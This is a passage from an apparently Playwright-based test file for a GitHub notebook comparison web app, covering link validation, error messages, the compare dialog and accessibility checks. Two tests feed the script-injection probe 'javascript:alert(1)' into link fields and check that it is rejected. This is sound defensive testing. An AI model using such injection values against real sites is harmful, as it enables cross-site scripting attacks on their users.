      await page.fill('#link-a', a); await page.fill('#link-b', b);
      await page.click('#links-form button[type="submit"]');
      await page.waitForSelector('.diffview');
      const hash = await page.evaluate(() => decodeURIComponent(location.hash));
      assert(hash === `#/compare/links/${wantA}/${wantB}`, { a, b, hash });
    });
  }
});

test('compare by link: unusable input is explained on the form', async () => {
  const bad = [['', 'alice/one/a.ipynb', /Enter a notebook link/i], ['https://github.com/alice/one', 'alice/one/a.ipynb', /repo or folder/], ['https://gist.github.com/someone/0123abcd', 'alice/one/a.ipynb', /notebook file on GitHub/], ['ftp://example.com/a.ipynb', 'alice/one/a.ipynb', /isn't a GitHub notebook link/], ['javascript:alert(1)', 'alice/one/a.ipynb', /isn't a GitHub notebook link/]];
  for (const [a, b, re] of bad) {
    await run({ hash: '#/compare', settle: 300 }, async ({ page, requests }) => {
      await page.fill('#link-a', a); await page.fill('#link-b', b);
      await page.click('#links-form button[type="submit"]');
      const r = await page.evaluate(() => ({ msg: document.querySelector('#compare-msg').textContent, shown: !document.querySelector('#compare-msg').hidden, hash: location.hash }));
      assert(r.shown && re.test(r.msg) && r.hash === '#/compare' && !requests.length, { a, r });
    });
  }
});

test('compare by link: unreachable and missing notebooks give clear messages', async () => {
  const l = (a, b) => `#/compare/links/${encodeURIComponent(a)}/${encodeURIComponent(b)}`;
  await run({ hash: l(rawOf('alice', 'one', 'main', 'nb.ipynb'), rawOf('bob', 'two', 'main', 'gone.ipynb')), raw: u => (u.includes('/bob/') ? { status: 404, body: 'Not Found', type: 'text/plain' } : twoRepos(u)), settle: 300 }, async ({ page }) => {
    const s = await state(page); assert(/Not found: bob\/two@main/.test(s.err), s);
  });
  await run({ hash: l(rawOf('alice', 'one', 'main', 'nb.ipynb'), 'https://blocked.example/nb.ipynb'), raw: twoRepos, other: () => ({ abort: true }), settle: 300 }, async ({ page }) => {
    const s = await state(page); assert(/Couldn't load blocked\.example/.test(s.err) && /CORS/.test(s.errText), s);
  });
  await run({ hash: l('javascript:alert(1)', rawOf('alice', 'one', 'main', 'nb.ipynb')), raw: twoRepos, settle: 300 }, async ({ page, requests }) => {
    const s = await state(page); assert(/Unsupported link/.test(s.err) && !requests.some(u => /^javascript:/i.test(u)), s);
  });
});

test('compare dialog: a different notebook (and not both fields at once)', () => run({ hash: '#/github/alice/one/blob/main/t.ipynb', raw: twoRepos, settle: 400 }, async ({ page }) => {
  await page.click('#compare-btn');
  await page.fill('#compare-base', 'dev'); await page.fill('#compare-other', 'bob/two/b/nb.ipynb');
  await page.click('#compare-form button[type="submit"]');
  assert(await page.evaluate(() => document.querySelector('#compare-dialog').open && /only one/.test(document.querySelector('#compare-error').textContent)), 'both fields accepted');
  await page.fill('#compare-base', '');
  await page.click('#compare-form button[type="submit"]');
  await page.waitForSelector('.diffview');
  const hash = await page.evaluate(() => decodeURIComponent(location.hash));
  assert(hash === `#/compare/links/${rawOf('bob', 'two', 'HEAD', 'b/nb.ipynb')}/${rawOf('alice', 'one', 'main', 't.ipynb')}`, hash);
}));

test('compare pages pass axe', async () => {
  const axeFile = require.resolve('axe-core/axe.min.js');
  for (const [name, opts] of [['pick', { hash: '#/compare' }], ['diff', { hash: CMP, raw: byRef }]]) {
    await run({ ...opts, settle: 400 }, async ({ page }) => {
      await page.addScriptTag({ path: axeFile });
      const v = await page.evaluate(() => axe.run(document, { runOnly: ['wcag2a', 'wcag2aa', 'best-practice'] }).then(r => r.violations.map(x => `${x.id} (${x.nodes.length})`)));
      assert(!v.length, { name, v });
    });
  }
});

/* ---------- runner ---------- */

(async () => {
  const only = process.argv[2];
  await start();
  let failed = 0;
  for (const t of tests.filter(t => !only || t.name.includes(only))) {
    const t0 = Date.now();
    try { await t.fn(); console.log(`PASS  ${t.name}  (${Date.now() - t0} ms)`); } catch (e) { failed++; console.log(`FAIL  ${t.name}\n      ${String(e.message).slice(0, 600)}`); }
  }
  await stop();
  console.log(failed ? `\n${failed} failed` : '\nall passed');
  process.exit(failed ? 1 : 0);
})();
